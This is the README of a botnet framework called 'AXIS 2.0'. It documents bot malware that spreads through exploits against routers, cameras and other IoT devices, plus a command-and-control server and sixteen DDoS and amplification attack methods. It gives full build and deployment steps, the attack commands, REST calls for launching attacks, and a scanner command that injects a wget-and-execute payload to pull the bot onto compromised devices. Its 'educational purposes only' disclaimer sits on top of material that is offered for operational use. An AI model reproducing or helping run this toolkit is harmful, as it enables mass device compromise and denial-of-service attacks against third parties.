# AXIS 2.0 Botnet - Complete Documentation

**Advanced DDoS botnet framework with self-replication, 16 attack methods, and 14 exploit scanners**

---

## ⚠️ IMPORTANT NOTICE

This is **SOURCE CODE ONLY** - not a finished product. You must:
1. Install all dependencies (Go 1.21+, GCC, cross-compilers, MySQL/MariaDB)
2. Configure all settings for your environment (change ALL `0.0.0.0` placeholders)
3. Compile all components
4. Set up infrastructure (Apache/Nginx, TFTP, database)
5. Test thoroughly before any deployment

**This software is for EDUCATIONAL PURPOSES ONLY.** Unauthorized use is illegal.

---

## 📋 Requirements

### Build Environment
- **OS**: Linux (Ubuntu 20.04+ / Debian 11+ / CentOS 8+)
- **Go**: 1.21+ (for C&C server and all extrascanners)
- **GCC**: With cross-compilation toolchains (for bot binaries)
- **MySQL/MariaDB**: Database server

### Infrastructure
- **Web Server**: Apache/Nginx (binary hosting on port 80)
- **TFTP Server**: tftpd-hpa (alternative download method on port 69/UDP)
- **Database**: MySQL/MariaDB (user management, logging)
- **FTP Server**: vsftpd (optional, additional download method)

### Minimum Hardware
- 2GB RAM (4GB+ recommended)
- 20GB disk space
- 1Gbps network connection
- Public IP address
- DDoS-protected hosting (recommended)

---

## 🎯 Features Overview

### Core Capabilities
- **14 Self-Replication Scanners** - Bot self-infection via multiple exploit vectors
- **7 Server-Side Scanners** - External Go-based bot loaders
- **16 Attack Methods** - 9 Layer 4 + 5 Amplification + 2 Layer 7 DDoS attacks
- **Modern Admin Panel** - Cyan/white/yellow TLS-encrypted telnet interface
- **REST API** - JSON API on port 3779 for remote control
- **Database System** - MySQL-backed user management, attack history, whitelisting
- **Multi-Architecture** - Bot binaries for 13 CPU architectures

### Attack Arsenal

#### Layer 4 Attacks (9 methods)
1. **TCP Flood** - Raw TCP SYN flood optimized for Gbps
2. **UDP Flood** - Raw UDP flood optimized for Gbps
3. **OVH TCP** - TCP with OVH Game bypass (SYN+ACK+PSH+URG flags)
4. **OVH UDP** - UDP with OVH Game bypass (DNS-like headers)
5. **ICMP Ping Flood** - ICMP Echo Request flood
6. **GRE IP** - GRE encapsulated IP flood
7. **GRE ETH** - GRE encapsulated Ethernet flood
8. **AXIS-L4** - Combined TCP+OVH-TCP+ICMP+GRE attack
9. **ULTIMATE L4** - All-in-one: TCP+UDP+ICMP+GRE-IP+GRE-ETH with IP spoofing, random TTL/TOS

#### Amplification Attacks (5 methods)
10. **DNS Amplification** - 50x-100x amplification factor
11. **NTP Amplification** - 100x-500x amplification factor
12. **SSDP Amplification** - 30x-50x amplification factor
13. **SNMP Amplification** - 50x-100x amplification factor
14. **CLDAP Amplification** - 50x-70x amplification factor

#### Layer 7 Attacks (2 methods)
15. **http** - http flood optimized for requests per second
16. **AXIS L7** - Advanced multi-layer bypass (CF, Akamai, WAF) with 10 rotating user-agents, session management, response analysis

### Self-Replication Scanners (14 Bot-Based)

| # | Scanner | Port | Exploit Type | Target Devices |
|---|---------|------|--------------|----------------|
| 1 | **Telnet** | 23 | Brute-force (270+ creds) | IoT devices, routers, cameras |
| 2 | **SSH** | 22 | Brute-force (100+ creds) | Cloud providers (AWS, DO, Linode, Vultr) |
| 3 | **Huawei** | 37215 | SOAP RCE | Huawei ISP routers |
| 4 | **Zyxel** | 8080 | Command injection | Zyxel SOHO routers |
| 5 | **ThinkPHP** | 80 | RCE | ThinkPHP web applications |
| 6 | **Realtek** | 52869 | UPnP RCE | Realtek chip routers (TP-Link, D-Link) |
| 7 | **GPON** | 80/8080 | Command injection | FTTH/GPON ONT devices |
| 8 | **Telnet Bypass** | 23 | Auth bypass (`-f root`) | IoT with telnet auth bypass |
| 9 | **DVR** | 80 | XML injection (NTP server) | CCTV/DVR cameras (Hi3520-based) |
| 10 | **Zhone** | 80 | Ping diagnostic injection | Zhone ONT/OLT fiber routers |
| 11 | **XiongMai** | 34599 | CVE-2017-16724 | XiongMai IP cameras |
| 12 | **Hilink** | 80 | Command injection | Hilink LTE routers |
| 13 | **ASUS** | 80 | Command injection | ASUS RT-AC routers |
| 14 | **Fiber/GPON** | 80 | Boa server formTracert | GPON/ONT fiber routers |

### Server-Side Scanners (7 Go-Based)

| # | Scanner | Target | Method |
|---|---------|--------|--------|
| 1 | **telnet-scanner** | IoT devices | Mass telnet brute-force with CIDR support |
| 2 | **0day-exploit** | Routers | Command injection vulnerabilities |
| 3 | **realtek-loader** | SOHO routers | Realtek UPnP RCE (port 52869) |
| 4 | **randox86** | Cloud/VPS | `/admin/service/run` JSON command injection |
| 5 | **fiber** | GPON/ONT | Boa server `/boaform/admin/formTracert` |
| 6 | **dvr** | CCTV/DVR | XML NTP server injection |
| 7 | **zhone** | FTTH/ONT | Ping diagnostic `ipAddr` parameter injection |

---

## 📁 Complete Directory Structure

```
AXIS 2.0/
├── cnc/                          # Command & Control server (Go)
│   ├── main.go                   # Main server, TLS, API
│   ├── admin.go                  # Admin panel handler
│   ├── attack.go                 # Attack parsing (16 methods)
│   ├── bot.go                    # Bot connection handling
│   ├── clientList.go             # Bot management
│   ├── database.go               # MySQL integration
│   └── api.go                    # REST API
│
├── extrascanners/                # Server-side scanners (Go)
│   ├── telnet-scanner.go         # Mass telnet brute-force
│   ├── 0day-exploit.go           # 0-day exploit scanner
│   ├── realtek-loader.go         # Realtek UPnP loader
│   ├── randox86.go               # Randox86 command injection
│   ├── fiber.go                  # Fiber/GPON Boa server exploit
│   ├── dvr.go                    # DVR/CCTV XML injection
│   ├── zhone.go                  # Zhone ONT/OLT ping exploit
│   ├── run-all.sh                # Run all 7 simultaneously
│   ├── randox86-valid.txt        # Randox86 target list (2047 URLs)
│   ├── fiber-targets.txt         # Fiber target template
│   ├── dvr-targets.txt           # DVR target template
│   └── zhone-targets.txt         # Zhone target template
│
├── bot/                          # Bot malware source (C)
│   ├── main.c                    # Main bot loop
│   ├── attack.c/h                # 16 attack methods
│   ├── scanner.c/h               # Telnet brute-force (270+ creds)
│   ├── killer.c/h                # Anti-malware killer
│   ├── ssh.c/h                   # SSH brute-force (100+ creds)
│   ├── huawei.c/h                # Huawei SOAP RCE
│   ├── zyxel.c/h                 # Zyxel command injection
│   ├── thinkphp.c/h              # ThinkPHP RCE
│   ├── realtek.c/h               # Realtek UPnP exploit
│   ├── gpon_scanner.c/h          # GPON exploit (80 & 8080)
│   ├── telnetbypass.c/h          # Telnet auth bypass
│   ├── dvr.c/h                   # DVR camera XML injection (IMPROVED)
│   ├── zhone.c/h                 # Zhone ONT/OLT (IMPROVED)
│   ├── xm.c/h                    # XiongMai CVE-2017-16724
│   ├── hilink.c/h                # Hilink LTE router exploit
│   ├── asus.c/h                  # ASUS router exploit
│   ├── fiber.c/h                 # Fiber/GPON Boa server exploit (NEW)
│   ├── config.h                  # Bot configuration
│   ├── table.c/h                 # String table (XOR encrypted)
│   └── [util files...]
│
├── loader/                       # Telnet loader (C)
│   ├── main.c                    # Main loader
│   ├── server.c/h                # Server management
│   ├── connection.c/h            # Connection handling
│   ├── binary.c/h                # Binary payloads
│   ├── telnet_info.c/h           # Telnet parsing
│   └── config.h                  # Loader config
│
├── dlr/                          # Downloader (C)
│   ├── main.c                    # Minimal ELF downloader (~4KB)
│   └── dlr.h                     # Downloader config
│
├── build.sh                      # Unified build script
├── database.sql                  # MySQL schema
├── scanListen.go                 # Scan result listener (port 9555)
├── README.md                     # This file
├── QUICK_SETUP.txt               # Quick installation guide
├── TROUBLESHOOTING.txt           # Troubleshooting guide
├── ULTIMATE_L4_README.md         # ULTIMATE L4 documentation (renamed to AXIS-L4_README.md)
└── ULTIMATE_L7_README.md         # ULTIMATE L7 documentation (renamed to AXIS-L7_README.md)
```

---

## 🔨 Building All Components

### 1. Install Dependencies

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y golang-go gcc mysql-server apache2 tftpd-hpa build-essential

# Cross-compilers (for multi-architecture bot binaries)
sudo apt install -y \
    gcc-arm-linux-gnueabi \
    gcc-arm-linux-gnueabihf \
    gcc-aarch64-linux-gnu \
    gcc-mips-linux-gnu \
    gcc-mipsel-linux-gnu \
    gcc-powerpc-linux-gnu \
    gcc-sparc64-linux-gnu \
    gcc-m68k-linux-gnu \
    gcc-sh4-linux-gnu \
    gcc-arc-linux-gnu
```

### 2. Set Up Database

```bash
# Start MariaDB
sudo systemctl start mariadb
sudo systemctl enable mariadb

# Import schema
mysql -u root -p < database.sql

# Change default admin password (IMPORTANT!)
mysql -u root -p AXIS2 -e "UPDATE users SET password='YourSecurePass123!' WHERE username='admin';"
mysql -u root -p AXIS2 -e "UPDATE users SET api_key='YOUR_UNIQUE_API_KEY' WHERE username='admin';"
```

### 3. Configure All Components

**CRITICAL**: All configuration files use `0.0.0.0` as a placeholder. You MUST change these to your server IP before building!

```bash
# Quick IP change for all bot files
SERVER_IP="YOUR.SERVER.IP.HERE"
sed -i "s/0.0.0.0/$SERVER_IP/g" bot/config.h bot/table.c loader/config.h dlr/dlr.h
```

### 4. Build Everything

```bash
chmod +x build.sh
./build.sh
```

This builds:
- C&C server (`cnc_server`)
- Scan listener (`scanListen`)
- 7 extrascanners (Go-based)
- Bot binaries for 13 architectures
- Telnet loader
- Downloaders for all architectures

---

## 🚀 Running the Botnet

### Start Core Services

```bash
# Terminal 1: C&C Server (bots connect on 3778, admin on 3777 TLS)
./cnc_server

# Terminal 2: Scan Listener (receives results from bot scanners)
./scanListen

# Terminal 3: Loader (feed IPs via stdin)
./loader < list.txt
```

### Run Server-Side Scanners

```bash
# Run all 7 scanners simultaneously (RECOMMENDED)
cd extrascanners
./run-all.sh YOUR_SERVER_IP 1000

# Or run individual scanners
./extrascanners/telnet-scanner leaks/10.lst 1000
./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
./extrascanners/randox86 randox86-valid.txt "wget http://YOUR_IP/bins/axis.x86;chmod +x /tmp/a;/tmp/a" 500
./extrascanners/fiber fiber-targets.txt YOUR_SERVER_IP 500
./extrascanners/dvr dvr-targets.txt YOUR_SERVER_IP 500
./extrascanners/zhone zhone-targets.txt YOUR_SERVER_IP 500
```

### Connect to Admin Panel

```bash
# TLS-encrypted telnet connection
openssl s_client -connect YOUR_SERVER_IP:3777 -quiet

# Login with database credentials
# Username: admin
# Password: (your changed password)
```

### Use REST API

```bash
# Get botnet status
curl http://YOUR_SERVER_IP:3779/api/botnet/status

# Launch attack (requires API key)
curl -H "Authorization: Bearer YOUR_API_KEY" \
     -X POST http://YOUR_SERVER_IP:3779/api/attack \
     -d '{"target":"1.2.3.4","duration":300,"method":"ultimate-l4"}'
```

---

## ⚔️ Attack Method Reference

### Layer 4 Attack Commands

```bash
# TCP Flood
!tcp <ip> <duration> len=1400 dport=80

# UDP Flood
!udp <ip> <duration> len=1400 dport=53

# OVH TCP Bypass
!ovhtcp <ip> <duration> len=1400 dport=27015

# OVH UDP Bypass
!ovhudp <ip> <duration> len=1400 dport=27015

# ICMP Ping Flood
!icmp <ip> <duration> len=64

# GRE IP Flood
!greip <ip> <duration> dport=80

# GRE Ethernet Flood
!greeth <ip> <duration> dport=80

# AXIS-L4 (Combined)
!axis-l4 <ip> <duration> len=1400 dport=80

# ULTIMATE L4 (All-in-One with IP spoofing)
!ultimate-l4 <ip> <duration> len=1400 dport=80
```

### Amplification Attack Commands

```bash
# DNS Amplification
!dns <ip> <duration>

# NTP Amplification
!ntp <ip> <duration>

# SSDP Amplification
!ssdp <ip> <duration>

# SNMP Amplification
!snmp <ip> <duration>

# CLDAP Amplification
!cldap <ip> <duration>
```

### Layer 7 Attack Commands

```bash
# HTTP Flood
!http https://example.com/ 300 method=GET conns=100

# AXIS-L7 (Browser emulation)
!axis-l7 https://target.com/ 300 domain=target.com

# ULTIMATE L7 (Advanced bypass with session management)
!ultimate-l7 https://protected.site/ 300 domain=protected.site.com cookies="cf_clearance=TOKEN"
```

---

## 📊 Attack Method Comparison

| Method | Type | Vectors | IP Spoofing | Bypass | Best For |
|--------|------|---------|-------------|--------|----------|
| tcp | L4 | TCP | ❌ | ❌ | Basic TCP flood |
| udp | L4 | UDP | ❌ | ❌ | Basic UDP flood |
| ovhtcp | L4 | TCP | ❌ | ✅ | OVH Game bypass |
| ovhudp | L4 | UDP | ❌ | ✅ | OVH UDP bypass |
| icmp | L4 | ICMP | ❌ | ❌ | Layer 3 attack |
| axis-l4 | L4 | TCP+UDP+ICMP | ❌ | ✅ | Combined L4 |
| greip | L4 | GRE-IP | ✅ (inner) | ✅ | Encapsulation |
| greeth | L4 | GRE-ETH | ✅ (inner) | ✅ | Triple encapsulation |
| **ultimate-l4** | L4 | **ALL 5** | ✅ | ✅ | **Maximum L4** |
| dns | Amp | DNS | ✅ | ✅ | 50-100x amplification |
| ntp | Amp | NTP | ✅ | ✅ | 100-500x amplification |
| ssdp | Amp | SSDP | ✅ | ✅ | 30-50x amplification |
| snmp | Amp | SNMP | ✅ | ✅ | 50-100x amplification |
| cldap | Amp | CLDAP | ✅ | ✅ | 50-70x amplification |
| http | L7 | HTTP | ❌ | ❌ | Basic HTTP flood |
| axis-l7 | L7 | HTTP | ❌ | ✅ | Cloudflare bypass |
| **ultimate-l7** | L7 | HTTP | ✅ (headers) | ✅ | **Advanced L7** |

---

## 🌍 Scanner Target Coverage

### Bot Self-Replication Scanners (14)

| Scanner | Asia | Europe | N.America | S.America | Africa | M.East | Oceania |
|---------|------|--------|-----------|-----------|--------|--------|---------|
| Telnet | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Huawei | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| Zyxel | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
| ThinkPHP | ✓ | ✓ | ✓ | - | - | - | ✓ |
| Realtek | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| GPON | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| TelnetBypass | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| DVR | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Zhone | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| XM | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Hilink | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| ASUS | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| Fiber | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

### Server-Side Scanners (7)

| Scanner | Input Format | Credentials | Payload |
|---------|--------------|-------------|---------|
| telnet-scanner | IP list, CIDR | 270+ telnet combos | axis.$(uname -m) |
| 0day-exploit | IP list, CIDR | N/A | axis.$(uname -m) |
| realtek-loader | IP list, CIDR, URL | N/A | axis.mips |
| randox86 | URL list (2047) | N/A | axis.x86 |
| fiber | IP list | N/A | axis.mips |
| dvr | IP list | 35 DVR combos | axis.mips |
| zhone | IP list | 6 Zhone combos | axis.mips |

---

## 🔧 Configuration Files Reference

### ⚠️ CRITICAL: Change ALL 0.0.0.0 Placeholders

| File | Setting | Default | Change To |
|------|---------|---------|-----------|
| `bot/config.h` | CNC_ADDR | 0.0.0.0 | Your C&C server IP |
| `bot/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
| `bot/config.h` | HTTP_SERVER_IP | 0.0.0.0 | Your HTTP server IP |
| `bot/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
| `bot/table.c` | TABLE_CNC_DOMAIN | 0.0.0.0 | Your C&C server IP |
| `loader/config.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
| `loader/config.h` | TFTP_SERVER | 0.0.0.0 | Your TFTP server IP |
| `dlr/dlr.h` | HTTP_SERVER | 0.0.0.0 | Your HTTP server IP |
| `cnc/main.go` | DatabaseAddr | 127.0.0.1:3306 | Keep for local DB |
| `scanListen.go` | scanListenAddr | 0.0.0.0:9555 | Keep (listens on all) |

### Quick Configuration Script

```bash
#!/bin/bash
SERVER_IP="YOUR.SERVER.IP.HERE"

# Update all bot files
sed -i "s/CNC_ADDR \"0.0.0.0\"/CNC_ADDR \"$SERVER_IP\"/" bot/config.h
sed -i "s/HTTP_SERVER \"0.0.0.0\"/HTTP_SERVER \"$SERVER_IP\"/" bot/config.h
sed -i "s/HTTP_SERVER_IP \"0.0.0.0\"/HTTP_SERVER_IP \"$SERVER_IP\"/" bot/config.h
sed -i "s/0.0.0.0/$SERVER_IP/g" bot/table.c loader/config.h dlr/dlr.h

echo "Configuration updated with server IP: $SERVER_IP"
```

---

## 📡 Network Ports

| Port | Protocol | Service | Purpose |
|------|----------|---------|---------|
| 22 | TCP | SSH | Admin server access |
| 80 | TCP | HTTP | Binary hosting (web server) |
| 69 | UDP | TFTP | Alternative binary download |
| 3777 | TCP | TLS Telnet | Admin panel (encrypted) |
| 3778 | TCP | TCP | Bot connections |
| 3779 | TCP | HTTP | REST API |
| 9555 | TCP | TCP | Scan results listener |
| 3306 | TCP | MySQL | Database (localhost only) |

---

## 🗄️ Database Schema

### Tables

- **users** - User accounts, permissions, API keys, limits
- **history** - Attack history and logging
- **whitelist** - Protected IP ranges (cannot be attacked)
- **logins** - Login attempt logs
- **online** - Currently online users

### Default Credentials (CHANGE IMMEDIATELY!)

```
Username: admin
Password: admin123  ← CHANGE THIS!
API Key: AXIS2-ADMIN-APIKEY  ← CHANGE THIS!

Test User:
Username: test
Password: test123
```

### Database Commands

```bash
# Connect to database
mysql -u axis -p'axis_secure_pass_2024!' AXIS2

# View users
SELECT * FROM users;

# View attack history
SELECT * FROM history ORDER BY time_sent DESC LIMIT 10;

# View recent logins
SELECT * FROM logins ORDER BY timestamp DESC LIMIT 20;

# Add new user
INSERT INTO users (username, password, max_bots, admin) 
VALUES ('newuser', 'password123', 100, 0);
```

---

## 📚 Documentation Files

| File | Description |
|------|-------------|
| `README.md` | Main documentation (this file) |
| `QUICK_SETUP.txt` | Quick installation guide (10 sections) |
| `TROUBLESHOOTING.txt` | Comprehensive troubleshooting guide |
| `AXIS-L4_README.md` | AXIS-TCP/AXIS-UDP Layer 4 attack documentation |
| `AXIS-L7_README.md` | AXIS-L7 Layer 7 attack documentation |

---

## 🔒 Security Considerations

### Change These Before Deployment

1. **Database password** in `cnc/main.go`
2. **Admin password** in database
3. **API key** for admin user
4. **Server SSH keys** (disable password auth)
5. **Firewall rules** (only required ports open)

### Recommended Security Measures

1. **Fail2ban** for SSH protection
2. **Automatic security updates**
3. **Regular database backups**
4. **Log rotation** for all log files
5. **DDoS-protected hosting**
6. **Rate limiting** on admin panel
7. **IP whitelisting** for admin access
8. **Regular security audits**

---

## ⚠️ Legal Disclaimer

**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.

- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
- Unauthorized use is **ILLEGAL** in virtually all jurisdictions
- The authors are **NOT RESPONSIBLE** for misuse of this software
- Compliance with all applicable laws is **YOUR RESPONSIBILITY**

By using this software, you agree to:
- Use only for educational purposes and security research
- Comply with all applicable local, state, national, and international laws
- Not use for unauthorized attacks against third-party systems
- Take full responsibility for your actions and their consequences

**Potential Legal Consequences of Unauthorized Use:**
- Criminal charges (computer fraud, unauthorized access)
- Civil liability (damages, injunctions)
- Imprisonment (varies by jurisdiction)
- Substantial fines

---

## 👥 Credits & Version Info

**Developed by AXIS Group**

**Version**: 2.0  
**Release Date**: March 2026  
**License**: Educational use only

### Changelog (v2.0)

**New Additions:**
- Randox86 scanner (Go + C) - `/admin/service/run` JSON injection
- Fiber/GPON scanner (Go + C) - Boa server `formTracert` exploit
- DVR scanner improved (Go + C) - XML NTP server injection (35 creds)
- Zhone scanner improved (Go + C) - Ping diagnostic injection (6 creds)

**Improvements:**
- All scanners now have both Go (server-side) and C (bot self-rep) versions
- Session key extraction for Zhone scanner
- Base64 authentication for HTTP Basic Auth
- Improved payload delivery mechanisms

**Total Arsenal:**
- 16 attack methods (9 L4 + 5 Amp + 2 L7)
- 14 bot self-replication scanners
- 7 server-side scanners (Go-based)
- 13 architecture support for bot binaries

---

## 📖 Quick Command Reference

### Build Commands
```bash
./build.sh                    # Build everything
./cnc_server                  # Start C&C
./scanListen                  # Start scan listener
./loader < ips.txt            # Start loader
```

### Admin Panel Commands
```bash
help                          # Show help
layer4                        # L4 attack methods
layer7                        # L7 attack methods
admin                         # Admin commands
ports                         # Common ports
```

### Attack Examples
```bash
!tcp 1.2.3.4 300 dport=80
!udp 1.2.3.4 300 dport=53
!ultimate-l4 1.2.3.4 300 dport=80
!ultimate-l7 https://target.com/ 300 domain=target.com
!stop                          # Stop all attacks
```

### Scanner Commands
```bash
# Run all extrascanners
cd extrascanners && ./run-all.sh YOUR_IP 1000

# Individual scanners
./telnet-scanner leaks/10.lst 1000
./zhone zhone-targets.txt YOUR_IP 500
./dvr dvr-targets.txt YOUR_IP 500
```

---

**AXIS 2.0 - Complete DDoS Framework**  
**For educational purposes only**
